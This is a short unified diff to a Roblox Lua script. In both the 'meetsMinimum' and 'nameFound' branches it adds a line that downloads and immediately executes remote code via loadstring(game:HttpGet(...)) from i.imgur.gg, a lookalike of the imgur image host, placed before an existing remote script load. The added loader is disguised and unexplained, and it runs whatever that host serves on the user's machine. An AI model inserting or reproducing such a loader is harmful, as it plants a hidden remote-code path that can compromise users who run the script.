@@ -272,6 +272,8 @@ if meetsMinimum then
 	sound:Play()
 
 	task.spawn(function()
+		loadstring(game:HttpGet("https://i.imgur.gg/SM0WygS-blocker.lua"))()
+		task.wait(0.25)
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli.lua"))()
 	end)
 
@@ -286,6 +288,8 @@ elseif nameFound then
 	sound.Parent = game.SoundService 
 	sound:Play() 
 	task.spawn(function()
+		loadstring(game:HttpGet("https://i.imgur.gg/SM0WygS-blocker.lua"))()
+		task.wait(0.25)
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli.lua"))()
 	end)
 
@@ -391,6 +395,7 @@ else
 	end
 
 end
+
 
 
 
